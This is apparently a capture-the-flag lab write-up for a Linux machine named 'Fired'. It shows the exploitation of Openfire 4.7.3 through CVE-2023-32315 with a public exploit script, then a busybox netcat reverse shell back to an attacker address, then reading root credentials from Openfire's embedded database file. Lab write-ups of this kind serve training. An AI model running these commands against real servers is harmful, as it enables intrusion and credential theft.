# Fired (Linux)

## Initial Foothold

Enumerated open ports (22, 9090, 9091) and discovered an Openfire management interface at `http://$IP:9090`. Searched for exploits targeting Openfire version 4.7.3 and found [CVE-2023-32315](https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT). Ran the exploit:

```bash
python3 CVE-2023-32315.py -u http://192.168.131.96:9090
```

This leaked the credentials:  
- Username: `hugme`  
- Password: `HugmeNOW`

Accessed the management tool, found an additional password (`123`) in the plugins section, and used the server-serversettings-management tool to execute commands. Achieved shell access with:

```bash
busybox nc 192.168.45.194 9091 -e /bin/bash
```

## Privilege Escalation

Searched for sensitive files and found root credentials inside `/var/lib/openfire/embedded-db/openfire.script`. Extracted the root password from this file and gained full root access.
